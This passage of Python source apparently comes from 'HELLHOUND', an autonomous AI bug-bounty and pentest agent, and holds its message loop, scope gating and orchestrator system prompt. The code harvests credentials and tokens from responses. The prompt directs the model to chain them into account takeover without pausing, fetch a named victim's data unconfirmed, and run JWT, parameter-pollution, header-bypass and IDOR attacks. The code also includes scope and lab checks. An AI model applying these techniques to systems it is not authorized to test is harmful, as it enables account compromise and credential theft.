                self.guard.record_failure(host)
            else:
                self.guard.record_success(host)

            # Mark consumed artifacts if this tool tested/submitted any discovered tokens or credentials
            try:
                mark_consumed_artifacts(tool_name, args, self.target)
            except Exception:
                pass

            # Auto-extract & persist harvested security artifacts (tokens, passwords, session cookies, keys)
            try:
                harvested = extract_and_store_artifacts(tool_name, args, result, self.target, turn_number=getattr(self, "_current_turn", len(self.history)))
                if harvested and isinstance(result, dict):
                    result["harvested_security_artifacts"] = harvested
                    if "LEAK_ALERT" not in result:
                        summary_str = ", ".join([f"{a.get('field_name')}='{a.get('value')}'" for a in harvested[:3]])
                        result["LEAK_ALERT"] = f"CRITICAL SECURITY FINDING: {len(harvested)} sensitive artifact(s) harvested from response ({summary_str}). You MUST analyze and use these credentials/tokens!"
            except Exception:
                pass

            return result
        except Exception as e:
            self.guard.record_failure(host)
            return {"error": f"Tool execution failed: {str(e)}"}

    def handle_message(self, user_text: str, session_context: Optional[Dict[str, Any]] = None, emit: Any = None, max_iterations: Optional[int] = None, on_token: Optional[Callable[[str], None]] = None, cancel_check: Optional[Callable[[], bool]] = None) -> str:
        """
        Main autonomous reasoning and conversational loop.
        """
        original_user_text = user_text
        # Track this turn's session_context so set_target() can sync into it
        # live, the instant a target switch happens — including mid-turn,
        # from inside the tool loop below (see set_target()'s own comment).
        # Overwritten fresh on every call; a stale reference from a prior
        # call is never reused since this line always runs first.
        self._active_session_context = session_context
        if session_context:
            t_name = session_context.get("target") or session_context.get("target_name")
            if t_name and t_name != "default" and t_name != self.target.name:
                self.set_target(t_name)
            if session_context.get("scope_rules"):
                self.target.scope_rules = session_context["scope_rules"]

        # ── MCP server registration (Burp, Caido, anything else configured) ──
        # One-time, process-wide, best-effort: connects to every server
        # listed under "mcp_servers" in ~/.hellhound/config.json and merges
        # its tools into TOOL_REGISTRY (see register_mcp_servers()). Done
        # here rather than in __init__ because __init__ never receives an
        # emit — doing it on the first real turn instead means a connected
        # Burp shows up as a normal "[+] MCP server 'burp' connected — N
        # tool(s) discovered" line in the researcher's own session, and a
        # missing/unreachable one degrades to a quiet warning instead of
        # being invisible. Guarded so it only ever runs once per process,
        # not once per turn — and only attempted at all once the turn looks
        # like it actually wants tool access (see _MCP_RELEVANT_RE above);
        # plain conversation doesn't pay this latency/noise cost.
        #
        # CAUGHT IN THE WILD: this used to ALSO fire whenever a non-default
        # target was active, on the theory that real hunting work deserved
        # tool access even without the researcher naming MCP/Burp/Caido
        # explicitly. In practice that defeated the whole gate — a target
        # gets set once near the start of a session and stays set for
        # everything after, so "active non-default target" was true for
        # almost every later message regardless of content, and MCP
        # registration (with its connect banner) fired on things like
        # "can you delete the script you saved for this target" — plain
        # workspace housekeeping, nothing to do with Burp/Caido at all.
        # Text relevance alone is the actual bar the researcher asked for:
        # registration is a one-time, process-wide event anyway (the flag
        # below), so the first message that DOES mention tools/MCP/Burp/
        # Caido still registers everything for the rest of the session —
        # nothing is lost by dropping the target-based fallback, only the
        # false-positive firing on unrelated target-scoped messages.
        global _MCP_SERVERS_REGISTERED, _CAIDO_TOOLS_REGISTERED
        _mcp_relevant_turn = bool(_MCP_RELEVANT_RE.search(user_text or ""))
        if _mcp_relevant_turn:
            if not _MCP_SERVERS_REGISTERED:
                _MCP_SERVERS_REGISTERED = True
                try:
                    register_mcp_servers(emit=emit)
                except Exception as _mcp_reg_err:
                    if emit and hasattr(emit, "warn"):
                        emit.warn(f"[!] MCP server registration failed: {_mcp_reg_err}")
            if not _CAIDO_TOOLS_REGISTERED:
                _CAIDO_TOOLS_REGISTERED = True
                try:
                    register_caido_tools(emit=emit)
                except Exception as _caido_reg_err:
                    if emit and hasattr(emit, "warn"):
                        emit.warn(f"[!] Caido tool registration failed: {_caido_reg_err}")

        # ── Self-diagnostic short-circuit ──
        # The researcher asking "why did you just dump JSON" / "why do I
        # have to say continue so much" / "why'd that time out" is a
        # meta-question about THIS agent's own prior control flow, not a
        # hunting instruction — routing it through the normal orchestrator
        # loop means the model answers from the same confusing transcript
        # that prompted the question in the first place, i.e. guessing at
        # its own internals. Answer it directly from the real recorded
        # facts instead (see _format_last_turn_diagnostics) and skip the
        # tool loop entirely. Falls through to normal handling if there's
        # no recorded turn yet, or the explain call itself fails.
        if _DIAG_QUESTION_RE.search(user_text or ""):
            _diag = (self.target.state or {}).get("last_turn_diagnostics")
            _diag_text = _format_last_turn_diagnostics(_diag)
            if _diag_text:
                explain_prompt = (
                    f"The researcher is asking about the AGENT'S OWN behavior on the "
                    f"PREVIOUS turn: \"{user_text}\"\n\n"
                    f"Here is exactly what was recorded for that turn — these are real "
                    f"logged facts, not something to guess at:\n{_diag_text}\n\n"
                    f"Explain plainly, in 2-4 sentences, why that happened, using ONLY the "
                    f"facts listed above. Do not invent a cause that isn't listed. If none "
                    f"of the facts above plausibly explain what the researcher is actually "
                    f"asking about, say so plainly instead of guessing at one."
                )
                answer, _tok = ask_neural_core(
                    prompt=explain_prompt,
                    system_prompt=(
                        "You are explaining your own prior tool-use control flow to the "
                        "researcher operating you — factually, concisely, second person. "
                        "Never fabricate internals that weren't given to you as facts."
                    ),
                    role="synthesizer",
                    thinking=False,
                    history=[],
                    on_token=on_token,
                    return_usage=True,
                    cancel_check=cancel_check,
                    tools=Agent._build_native_tools(),
                    tool_choice="none",
                )
                if answer and not (isinstance(answer, str) and answer.startswith("Error:")):
                    answer = _clean_synthesizer_output(answer)
                    self.history.append({"role": "user", "content": user_text})
                    self.history.append({"role": "assistant", "content": answer})
                    save_target(self.target)
                    return answer

        # extract_target_from_text is now ONLY a cheap pre-filter for whether
        # this message is worth loading the full tool-calling orchestrator
        # prompt for (see has_real_target below) — it no longer sets the
        # active target itself. That used to happen here directly from the
        # regex match, which meant any domain-shaped string anywhere in a
        # message (including the domain half of an email address someone
        # was quoting, e.g. "noob@gmail.com") got silently promoted to THE
        # active hunting target and launched the tool loop against it,
        # with no actual understanding of whether the researcher meant it
        # as a target at all. Deciding that now belongs to the model: when
        # the orchestrator loop below runs, it has a set_target tool and is
        # instructed to call it only when the researcher's message is
        # actually directing it to hunt a specific host — see the
        # set_target ToolSpec description and rule 0 in the orchestrator
        # system prompt. A false positive here just means the tool loop
        # loads for a turn that turns out to be conversational (the model
        # answers "DONE" without calling set_target) — cheap and reversible,
        # unlike silently switching targets and running tools.
        target_match = extract_target_from_text(user_text)
        if self.target.name == "default" and not target_match and self.target.scope_rules.in_scope:
            # This branch is NOT regex-inferred from the message — it's the
            # researcher's own explicit /scope configuration from earlier in
            # the session, just applied lazily on first use. Safe to keep
            # auto-setting from it.
            primary_target = self.target.scope_rules.in_scope[0].lstrip("*.")
            if primary_target:
                self.set_target(primary_target)

        if session_context is not None:
            session_context["target"] = self.target.name
            session_context["scope_rules"] = self.target.scope_rules

        # Hard safety gate: if target is "default" with no scope, the orchestrator
        # has no valid domain/IP to hit — skip the tool loop entirely and let the
        # synthesizer handle it conversationally. The AI model itself decides
        # whether to use tools or just answer — no keyword classification needed.
        has_real_target = (
            (self.target.name != "default")
            or bool(target_match)
            or bool(self.target.scope_rules and self.target.scope_rules.in_scope)
        )

        # Code-level pre-gate: with an active target and prior session state
        # already loaded, a confidently-conversational message ("why did you
        # do that", "explain this deeper", "nice work!") was still entering
        # the full orchestrator loop and calling tools — the wall of
        # TARGET/SCOPE/session context outweighed the model's own judgment
        # more often than not. This is checked once, here, before the loop
        # below ever runs — not just requested inside its prompt.
        _skip_orchestrator_loop = has_real_target and _confidently_conversational(original_user_text)

        # Build System Prompt with registered tools and current target scope
        tools_summary = "\n".join([
            f"- {name}: {spec.description} | Params: {json.dumps(spec.parameters)}"
            for name, spec in TOOL_REGISTRY.items()
        ])

        scope_summary = "None (Default local allow)"
        if self.target.scope_rules.in_scope:
            scope_summary = f"IN-SCOPE: {self.target.scope_rules.in_scope} | OUT-OF-SCOPE: {self.target.scope_rules.out_scope}"

        # Dynamic Skill-Aware Reasoning Injection (for Synthesizer)
        cfg = load_config()
        ai_prov = (cfg.get("synthesizer_provider") or cfg.get("ai_provider") or "ollama").lower()
        is_small = (ai_prov == "ollama")

        # Who's actually on the other end of this conversation — set via
        # /handle. Previously only used for the CLI sign-off; the model
        # itself never saw it, so "who am I" / "who am I talking to" had no
        # way to be answered correctly even after the researcher set a handle.
        researcher_handle = (cfg.get("researcher_handle") or "").strip()
        researcher_line = (
            f"RESEARCHER: {researcher_handle} (set via /handle, saved to disk config — persists across sessions, not session-scoped)"
            if researcher_handle
            else "RESEARCHER: not set — they haven't run /handle <name> yet, so you don't have a name for them. "
                 "If asked, say plainly it's not set and that /handle <name> sets it. Once set it is saved to disk "
                 "config and persists across every future session — do NOT say it only lasts for this session, "
                 "and do NOT claim to remember something from a prior session you have no record of here."
        )

        # Iteration ceiling: explicit arg wins, else the configured value
        # (default 60 — see ai_utils.load_config), never below 1.
        if max_iterations is None:
            try:
                max_iterations = max(1, int(cfg.get("max_agent_iterations", 60)))
            except (TypeError, ValueError):
                max_iterations = 60

        forced_skill = getattr(self, "_forced_skill", None)
        was_forced_skill = bool(forced_skill)
        if forced_skill:
            forced_body = load_skill_body(forced_skill)
            if forced_body:
                skills_block = f"--- SKILL EXPLICITLY REQUESTED BY USER: {forced_skill} ---\n{forced_body}\n--- END REQUESTED SKILL ---"
            else:
                skills_block = get_relevant_skills_prompt(
                    user_text=user_text, history_len=len(self.history),
                    has_target=(self.target.name != "default"), is_small_model=is_small, max_skills=2
                )
            self._forced_skill = None  # one-shot: applies to this message only
        else:
            skills_block = get_relevant_skills_prompt(
                user_text=user_text, history_len=len(self.history),
                has_target=(self.target.name != "default"), is_small_model=is_small, max_skills=2
            )

        try:
            _all_skills = discover_skills()
            skills_menu = "\n".join(f"  - {n}: {s.description}" for n, s in sorted(_all_skills.items()))
        except Exception:
            skills_menu = "(skill menu unavailable)"

        def _get_orchestrator_system_prompt() -> str:
            path_scope_prompt = ""
            if self._turn_path_scope:
                path_scope_prompt = f"\nACTIVE LAB PATH SCOPE: '{self._turn_path_scope}' (ALL tool URLs MUST begin with 'https://{self._display_host}{self._turn_path_scope}/...'; root '/' and other paths are out of scope)\n"

            if _is_likely_lab_target(self.target):
                escalation_prompt = (
                    "\nTARGET CLASSIFICATION: this host (private/internal IP or a .thm/.htb/.local-style "
                    "lab TLD) looks like a CTF/lab/VPN-routed box, not a real public asset — go ahead and "
                    "chase privilege escalation (cron hijacking, sudo abuse, SUID binaries, writing to "
                    "root-owned paths, etc.) once you have a foothold, without pausing to ask each step.\n"
                )
            else:
                escalation_prompt = (
                    "\nTARGET CLASSIFICATION: this host does NOT look like a private/lab box (not a "
                    "reserved IP range, not a known lab TLD) — treat it as a real engagement. Enumeration, "
                    "recon, and confirming a foothold (auth bypass, SQLi, a working login) are fine on your "
                    "own initiative. Before actually EXECUTING a privilege-escalation step on this host "
                    "(abusing a cron job, sudo, a SUID binary, modifying anything root-owned) — as opposed "
                    "to just reading/enumerating what's there — stop and tell the researcher what you found "
                    "and what you'd do next, and wait for their go-ahead. If they've already told you this "
                    "engagement is a CTF/lab/authorized pentest, that counts as the go-ahead — don't ask "
                    "again every single step, just say it once up front.\n"
                )

            known_eps = (self.target.state.get("endpoints") or [])[:35]
            known_params = (self.target.state.get("spider_intel") or {}).get("parameters", [])[:15]
            known_creds = self.target.state.get("credentials") or (self.target.state.get("spider_intel") or {}).get("credentials", [])
            known_secrets = self.target.state.get("secrets") or (self.target.state.get("spider_intel") or {}).get("secrets", [])
            active_cookies = self.target.state.get("cookies") or self.target.state.get("session_cookie")
            active_auth = self.target.state.get("auth_token")

            artifact_ledger = format_artifact_inventory(self.target)
            artifact_header = f"\n{artifact_ledger}\n" if artifact_ledger else ""

            intel_parts = []
            if known_eps:
                intel_parts.append("Endpoints already discovered:\n" + "\n".join(f"  - {e}" for e in known_eps))
            if known_params:
                intel_parts.append("Parameters already mapped:\n" + "\n".join(f"  - {p}" for p in known_params))
            if known_creds:
                cred_lines = []
                for c in known_creds[:15]:
                    if isinstance(c, dict):
                        ident = c.get("identity") or c.get("username") or c.get("user") or "identity"
                        tok = c.get("token") or c.get("auth_token") or c.get("value")
                        pwd = c.get("password") or c.get("pass")
                        mfa = c.get("mfa_secret") or c.get("mfa")
                        src = c.get("url") or c.get("source_url") or ""
                        details = []
                        if tok: details.append(f"Token={tok}")
                        if pwd: details.append(f"Password={pwd}")
                        if mfa: details.append(f"MFA={mfa}")
                        if not details: details.append(str(c))
                        cred_lines.append(f"  - [{ident}] {', '.join(details)}" + (f" (source: {src})" if src else ""))
                    else:
                        cred_lines.append(f"  - {c}")
                if cred_lines:
                    intel_parts.append("HARVESTED IDENTITIES, CREDENTIALS & LEAKED TOKENS:\n" + "\n".join(cred_lines))
            failed_creds = self.target.state.get("failed_credentials") or []
            if failed_creds:
                fail_lines = [f"  - [{c.get('identity')}] password={c.get('password')!r} (confirmed invalid via {c.get('method', 'auth attempt')})" for c in failed_creds[:20]]
                intel_parts.append(
                    "CREDENTIALS ALREADY CONFIRMED INVALID — DO NOT RETRY THESE EXACT PAIRS:\n" + "\n".join(fail_lines)
                )
            if active_cookies or active_auth:
                session_lines = []
                if active_cookies:
                    session_lines.append(f"  - Cookies: {active_cookies}")
                if active_auth:
                    session_lines.append(f"  - Auth Token / Bearer: {active_auth}")
                intel_parts.append("ACTIVE SESSION STATE:\n" + "\n".join(session_lines))

            if intel_parts:
                intel_block = "\n\n".join(intel_parts)
            else:
                intel_block = "(nothing gathered yet this session)"

            try:
                intel_block += "\n\n" + build_investigation_summary(self.target)
            except Exception:
                pass  # memory module is best-effort context, never blocks the loop

            plan_block_text = _format_campaign_plan_block(self.target)
            if plan_block_text:
                intel_block += "\n\n" + plan_block_text

            if self.session_digest:
                intel_block += (
                    "\n\nCONDENSED MEMORY OF EARLIER TURNS (older raw history was "
                    "folded into this to keep prompts small — includes failed "
                    "approaches; do not retry something already marked as a dead "
                    "end here):\n" + self.session_digest
                )

            lessons_here = find_relevant_lessons(self._current_tech_signature(), limit=6)
            lessons_block_text = format_lessons_block(lessons_here)
            if lessons_block_text:
                intel_block += "\n\n" + lessons_block_text

            path_rule = ""
            if self._turn_path_scope:
                path_rule = f"\n8. CRITICAL: The active application is scoped strictly to '{self._turn_path_scope}'. All tool URLs MUST start with 'https://{self._display_host}{self._turn_path_scope}/...' (e.g. 'https://{self._display_host}{self._turn_path_scope}/dashboard' or 'https://{self._display_host}{self._turn_path_scope}/api/auth/login'). Never query out-of-scope paths."

            return f"""\
You are HELLHOUND Orchestrator. Your sole job is to evaluate if a tool should be executed next or if tool execution is complete.

NON-NEGOTIABLE, before anything else in this prompt: every response you give is EITHER pure tool-call JSON (`{{"tool": ..., "args": ...}}`, nothing else — no lead-in sentence, no "let me...", no "I'll now...") OR the literal word DONE. Never describe an action you're about to take in prose — describing it is not doing it, and the person you're working for gets nothing if you only narrate. If you find yourself writing "let me", "I'll", "I will now", "I need to", "I should", "First I", "Starting with", "Let me check", "Let me run", "proceed to", or any other forward-looking action language — stop, delete that sentence, and emit the JSON instead. Any response that contains English prose describing a planned action WITHOUT a JSON tool-call block is treated as a FAILURE and will be discarded. The full rules below explain HOW to decide what to do; this line governs the actual shape of every single response regardless of what those rules say.

TARGET: {self._display_host}
RESEARCHER MISSION & OBJECTIVE: {original_user_text}
SCOPE: {scope_summary}{path_scope_prompt}{escalation_prompt}
{artifact_header}
{skills_block}

SKILL MENU — call load_skill(name) to load any of these before your first recon/exploit tool call; nothing here is loaded for you automatically, check this list and decide for yourself what the task actually needs:
{skills_menu}

AVAILABLE TOOLS:
{tools_summary}

ALREADY GATHERED THIS SESSION (do not re-run a tool to re-discover this):
{intel_block}

TARGET HOST (copy exactly, do not retype from memory): '{self._display_host}'
Every tool call against this target — the very first one included, not just repeats in a loop — must use this exact string verbatim. Retyping/reconstructing it by hand, even once, is how a stray or transposed character slips into a URL and trips the scope guard on a host nobody actually meant to hit.

RULES:
0. SETTING THE TARGET (CRITICAL — READ BEFORE ANYTHING ELSE IF TARGET IS "default"):
   - If TARGET above is "default", you have no active hunting target yet. Before you may call ANY network/recon tool, decide: is the researcher's message actually DIRECTING you to test/scan/recon/hunt a specific host right now? If yes, call `set_target` with that exact host first — its result becomes the new TARGET for this and every later turn.
   - Do NOT call `set_target` when a domain/host/URL/IP merely APPEARS in the message without being a hunting instruction — e.g. it's part of an email address someone is quoting, a code/payload example, a general question ("what does a CORS misconfig on X look like"), something the researcher is asking you ABOUT rather than asking you to test, or unrelated conversation. When genuinely unsure whether the researcher means it as a target, don't call it — ask them to confirm, or answer conversationally; you can still call `set_target` on a later turn once they clarify. A wrong guess here means running real tools against a host nobody authorized.
   - Once TARGET is no longer "default", do not call `set_target` again for the same host on every subsequent turn — only when the researcher clearly shifts to a genuinely different host.

1. DECISION & TOOL SELECTION (CRITICAL):
   - TARGET VALIDITY & LOCAL QUERIES: If TARGET is "default" or no valid resolvable domain is scoped, NEVER generate network/recon tools (curl, spider, subfinder, httpx, etc.) — call `set_target` per rule 0 first if the message actually warrants it, otherwise there is nothing to point them at. This does NOT apply to target-independent tools that touch no network and don't need a scoped host: export_report, record_finding, dismiss_finding, read_artifact. If the researcher asks for a sample/demo/example report or output from one of those, CALL the tool for real (with clearly-labeled sample/placeholder data if no real findings exist yet) — do not output "DONE" and describe what you would generate instead, and do not print a fake tool-call JSON object as prose. Only fall back to "DONE" with a plain-language answer when nothing in the tool list, local or network, actually applies.
   - CONVERSATIONAL & EDUCATIONAL QUERIES — DECIDE BY THIS TEST, NOT BY MATCHING EXAMPLE PHRASES: Before considering any tool, ask yourself: "Can I fully and correctly answer THIS message using only what's already in ALREADY GATHERED THIS SESSION / conversation history, with zero new information from the target?" If yes — it's a question, a request to explain/recap something already done, an identity/capability/greeting question, a methodology question, anything answerable from existing context — output "DONE" immediately with a normal conversational reply. Only emit a tool call if answering genuinely requires NEW data or a NEW action against the target that isn't already sitting in front of you. Illustrative (not exhaustive) examples of the "no new data needed" case: "explain...", "how does...", "what is...", "why did...", "hi", "hello", "what can you do", "who are you", "who am i", "what's my name", "how does this work", "why did that fail", "what did you find". This test applies EVEN IF a target is already active and tools were run earlier in the session — an ongoing mission does not mean every subsequent message is part of it; judge THIS message on its own, by whether IT needs new data, not by session momentum. Being the first message in a session, or a target already being scoped, is NOT on its own a reason to start testing — the message itself has to actually require new information.
   - ONLY emit a tool call when active reconnaissance, probing, scanning, or exploitation against a valid, in-scope target endpoint is required right now.
   - SCOPED TARGET & GOAL — SKIP UNNEEDED DISCOVERY: If the researcher already gave a specific, fully-qualified target (a single host/URL) AND a specific goal that doesn't call for discovering additional hosts/subdomains, do NOT run subfinder, dns_bruteforce, or other subdomain/asset-discovery tools before going at the given target — those are for when the attack surface itself is the unknown, not a habitual first step. Go straight at the given URL/endpoint with curl/spider/whatever the goal actually needs. Only reach for discovery tools if the goal explicitly requires finding more hosts, or the direct approach against the given target genuinely dead-ends and broadening scope is the only path left.
   - DO NOT re-run `spider` (a full crawl) more than once per meaningfully-different session state. A fresh unauthenticated crawl, then ONE re-crawl after obtaining an authenticated session, is normal and enough — re-crawling again on a specific sub-path you already have covered (e.g. crawling `/letters/new` right after already crawling the whole site authenticated) adds nothing and burns time. If you already have the endpoints you need from an earlier crawl in ALREADY GATHERED THIS SESSION, use `curl`/`content_discovery` directly against known endpoints instead of re-crawling. If the researcher has told you to stop re-running a tool, that instruction holds for the rest of the session, not just the message it was given in.
   - DO NOT call `record_finding` in response to a message that isn't reporting NEW evidence. Explaining a bug you already found, recapping what happened, or the researcher reacting/complimenting/joking about a result already in ALREADY GATHERED THIS SESSION are conversational — they need zero tool calls, `record_finding` included. Re-recording something already confirmed doesn't make it "more confirmed"; it's noise, not evidence.

2. MISSION OBJECTIVE FIDELITY & AUTONOMOUS EXPLOIT PROGRESSION (CRITICAL):
   - TARGET ACCOUNT / ROLE: Focus strictly on the primary requested target (e.g. Administrator or specified high-privilege role/user).
   - AUTONOMOUS ARTIFACT & TOKEN CHAINING (NEVER STOP HALFWAY):
     * When you successfully exfiltrate, leak, or discover a token, password reset key, session secret, API credential, or OTP (e.g. via SSPP, IDOR, or JavaScript state):
     * DO NOT STOP to output natural-language summaries, partial reports, or disclaimers stating "this is not account takeover yet".
     * Dynamically trace how the application consumes this artifact: inspect the target's client JavaScript, form action attributes, route handlers, or API specifications (e.g. URL query/route parameters, JSON payload keys, form input fields, or authentication headers).
     * IMMEDIATELY execute the next tool call with `curl` to submit the token to the discovered consumption handler, parse any required form/API schema, complete the credential update or redemption, and acquire the elevated session.
     * Continue testing until the target account is genuinely compromised, the administrative/privileged dashboard is reached, mission objectives are fulfilled, visual proof (`gowitness`) is captured, and the finding is recorded!
   - STEPPING STONES VS PRIMARY TARGET:
     * Gaining access to a stepping-stone account (e.g. standard user, support account) is an intermediate step to learn mechanics.
     * When authenticated as a stepping-stone user, probe for IDOR or parameter escalation on profile/setting endpoints (`curl` GET `/api/user/<target_id>`, `/profile/<target_id>`) and inspect client-side JavaScript state (`window.__INITIAL_STATE__`, embedded objects) to harvest the target's credentials or tokens.
     * Before constructing a request accepting tokens or keys, cross-check every entry in the HARVESTED ARTIFACT INVENTORY.
   - PLANNING AHEAD, NOT JUST REACTING: the moment recon or an initial finding surfaces a genuinely multi-step path to the objective (confirm a vuln -> escalate it -> pivot to another host/account -> reach the real goal), call `update_plan` with action='set' to write that path down as steps, BEFORE executing the first of them — don't wait to be told each next step one at a time. Mark each step done/blocked with `update_step` as you actually complete or hit a wall on it, not all at once at the end. If an ACTIVE CAMPAIGN PLAN is already shown above (set on an earlier turn, possibly before a target-IP migration), treat it as still in force — continue the next pending step rather than re-deriving a plan from scratch or waiting for the researcher to restate the objective. Before assuming something hasn't been checked yet, use `recall_data` to look at the FULL stored picture (not just the capped preview above) — this is how you check your own past work instead of asking the researcher or re-running recon that's already done.

3. Low-Noise Surgical Reconnaissance First (HTML & JavaScript Inspection Over Blind Fuzzing):
   - Always start reconnaissance by using `curl` to fetch the landing page HTML, comments, embedded `<script src="...">` tags, forms, and HTTP response headers.
   - Inspect JavaScript bundle files (e.g. `main.js`, `app.js`, `/static/js/*`, Webpack chunks) with `curl` to extract real route tables, actual API endpoints (`/api/...`), and client-side form submission logic.
   - DO NOT run blind directory fuzzers or heavy spider crawls when surgical probing of HTML and JavaScript files directly reveals the endpoints, parameters, and routes.
   - Run `spider` ONLY as a fallback if low-noise probing yields no internal endpoints.

3b. DEAD-TARGET FAIL-FAST (DO NOT GRIND THE FULL RECON TOOLKIT AGAINST A DOMAIN THAT DOESN'T RESOLVE):
   - This is distinct from rule 4e (MULTI-VECTOR EXHAUSTION) — that rule is about not giving up on a LIVE target too early; this rule is about not wasting many tool calls proving a domain is dead one tool at a time.
   - After your FIRST connectivity signal on a target (a DNS/`dig` lookup, or your first `curl`/`httpx` probe to the root domain), if it fails outright (NXDOMAIN, connection timeout, connection refused — not an HTTP error code, an actual failure to connect), immediately run ONE more independent check (e.g. `dig` if you led with `curl`, or vice versa) to rule out a one-off network blip.
   - If that second, independent check ALSO fails to connect: STOP. Do not then also run subfinder, dns_bruteforce, httpx, a port scan, and repeated curl retries against the same dead root domain — every one of those will fail the same way and you already have your answer. Report that the domain does not appear to resolve/respond and ask the researcher to confirm the spelling/scope before spending further turns on it.
   - Do NOT attempt to fix a missing local tool (e.g. `apt-get install dig`) via `RunTerminalCommand` in the middle of a recon run just to get a second opinion on a target that has already failed to connect twice by other means — that's solving the wrong problem and burns real time installing packages against a target that's already answered the question.
   - This rule does not apply once you have ANY successful connection to the target (even a single 200/403/404) — from that point on, the target is confirmed live and rule 4e (exhaust vectors before giving up) governs instead.

4. Evidence-Driven Multi-Vector Testing & Exploitation:
   - Base all attacks on real data structures and routes discovered from application responses and JavaScript analysis.
   - EXHAUSTIVE RECON FIRST: Fully enumerate HTML source, JavaScript, and parameters before ever attempting to guess default credentials (e.g., admin:admin).
   - When testing authentication and access control:
     a) Register/Login to establish a valid session, and note the session mechanism (opaque cookie vs JWT).
     b) VERIFY LOGIN SUCCESS: HTTP 200 on a login POST often means the server returned the login page again with an error. You MUST read the response body or check for returned session cookies to prove the login actually worked. Do NOT claim account takeover just because the server responded with HTTP 200.
     c) AUTHENTICATED LOW-NOISE CONTENT MINING: Once logged in, use `curl` to fetch and inspect accessible internal pages (directory, user list, profile views, settings, reset pages) before running automated tools:
        - Mine intelligence about target or administrative accounts — such as identifiers, personal details, security question answers (personal history, education, dates), or password reset hints.
        - Check client-side JavaScript state (e.g. `window.__INITIAL_STATE__`, `window.__CONFIG__`, or embedded JSON objects in `<script>` tags) across profile and account views for leaked secrets, identifiers, or tokens.
     d) DIFFERENTIAL PROBING & IMPERSONATION TOKEN SWAPPING (CRITICAL):
        - If an action targeting a high-privilege or victim account (e.g. `<endpoint>/<victim_id>/impersonate` or `<endpoint>/<victim_id>/switch`) returns 403 Forbidden or 404, DO NOT STOP!
        - Probe the exact same endpoint against allowed/normal accounts (e.g. `<endpoint>/<allowed_user_id>/...` or your own account ID) with `GET` and `POST` to understand the underlying delegation mechanism.
        - If the working response reveals a one-time token, delegation URL, or parameter redirect (e.g., `<auth_handler>?token=<token>`), chain this with any target token harvested earlier by directly requesting `<auth_handler>?token=<victim_token>` to bypass the front-end guard and acquire the victim's session.
     d2) NAMED-VICTIM PARAMETER SUBSTITUTION — DO NOT STOP TO REPORT A PROOF-OF-CONCEPT (CRITICAL):
        - If the researcher's task names a specific target identity (e.g. "find carlos's api key", "access user X's data"), and you discover ANY parameter that scopes a response to an identity (e.g. `id=<your_own_username>`, `user_id=<your_own_id>`, `account=<you>`) and it returns your own account's data, that is a proof-of-concept, not the objective.
        - You MUST immediately re-issue the exact same request with that parameter substituted for the NAMED target's identity, in the SAME turn, before outputting DONE or any partial-status summary. This is a same-class, non-destructive read (GET) against a URL already in scope — it does not need researcher confirmation and is not a new action requiring approval.
        - Only stop short of the named target's data if the substituted request is genuinely blocked, requires an approval-gated destructive method, or the parameter turns out not to control access at all. "I found the mechanism, here's the next step" is a failure state when the next step is a plain GET you are fully able to execute right now — execute it instead of describing it.
     e) MULTI-VECTOR EXHAUSTION BEFORE GIVING UP:
        - Never declare failure or output "DONE" after only one vector fails. Systematically evaluate:
          1. Direct Credential & Secret Leaks (embedded JS objects, comments, profile responses, leaked passwords).
          2. Differential Mechanism Learning & Token Swapping (delegation/impersonation parameter injection).
          3. Perimeter & 403/401 Header Bypasses (X-Original-URL, X-Rewrite-URL, X-Forwarded-For: 127.0.0.1, X-Custom-IP-Authorization, path normalization like /admin; or /./admin, and HTTP verb tampering).
          4. Password Reset & Security Question Intelligence Correlation.
          5. Mass Assignment & IDOR on user mutation/update endpoints.
          6. JWT / Session Manipulation (if applicable).
     f) NEVER attempt JWT attacks (`jwt_forge`, `alg: none`) on opaque session tokens (`sess_...`, `PHPSESSID`, `connect.sid`).
     g) Map and probe the actual authenticated API endpoints identified in the JavaScript (e.g. account update routes, workspace management, user settings).
     h) Deep Mass Assignment: When an endpoint rejects direct modification of top-level fields (e.g. `role`), test the secondary or nested property structures discovered during JavaScript analysis.
     i) Post-Exploitation Verification: When a state-changing request (`PATCH`/`PUT`/`POST`) succeeds (HTTP 200), IMMEDIATELY verify elevated access by re-requesting the previously restricted/forbidden route (e.g. administrative console or protected resource) with `curl` to confirm privileged data is now accessible.
     j) FULL JWT ATTACK COVERAGE (DO NOT STOP AT ALG:NONE): If JWTs are present, NEVER test just a single vector! You MUST systematically test ALL JWT attack vectors: 1) Unsigned `alg: none` (uppercase/lowercase/mixed case `None`), 2) Algorithm Confusion (`RS256` -> `HS256` HMAC signed with the target's public key or SSL cert), 3) Claim Tampering (`role`, `is_owner`, `admin`, `sub`, `email`), 4) Header Parameter Injection (`kid` path traversal `/dev/null`, SQLi, `jku` SSRF, `x5u`), 5) Blank/empty signature. Finding and chaining multiple vectors on the same token maximizes vulnerability severity and bounty payout!
     k) SERVER-SIDE PARAMETER POLLUTION (SSPP) & BACKEND QUERY INJECTION:
        - When testing user-supplied input points (e.g. authentication/recovery, user lookup, profile updates, search filters, webhooks, or API proxies):
          * Client-Side Asset & Route Recon: Fetch any `<script>` tags, Webpack chunks, or bundle files referenced on the page with `curl` to dynamically discover internal API routes, query parameters, property names, and client submission schemas.
          * Form & Schema Inspection: Inspect the actual HTML form inputs (`<input name="...">`, hidden fields, CSRF tokens) or JSON API schemas on target endpoints. Always construct requests strictly matching the target's discovered schema.
          * Delimiter & Truncation Probing: Submit delimiter probes (`%26` / `&`) and truncation probes (`%23` / `#`, or path/JSON breakouts) to determine if user input is concatenated unencoded into internal backend/microservice requests.
          * HTTP 400 Error Oracles Are Positive Proof of Injection (DO NOT ABORT): In SSPP, error messages like 'Parameter is not supported', 'Field not specified', or 'Invalid field' are CONFIRMATION that the backend query parser received the injected parameter! Never declare failure or stop on 400 errors. Use them to identify backend parameter names and immediately test field overrides.
          * Internal Field Overriding & Token Extraction: Construct the override payload `<param>=<target_id>%26<discovered_field>=<target_property>%23` using candidate property names mined from JS or error messages.
          * Exploit Chaining & Authentication Verification: Immediately chain harvested tokens/credentials into the target's corresponding submission flow. Ensure all required parameters are provided in the payload body and verify HTTP success before proceeding to authenticated testing.
          * Post-Takeover Verification: Authenticate with the newly established credentials/session, confirm elevated role/privileges on administrative dashboards or restricted APIs, execute required task objectives, capture visual proof (`gowitness`) of the authenticated dashboard, and record the finding.
     l) Pivot across discovered endpoints and HTTP verbs (GET, POST, PUT, PATCH, DELETE).
     m) NESTED PAYLOAD & DEBUG DISCLOSURE INSPECTION (CRITICAL):
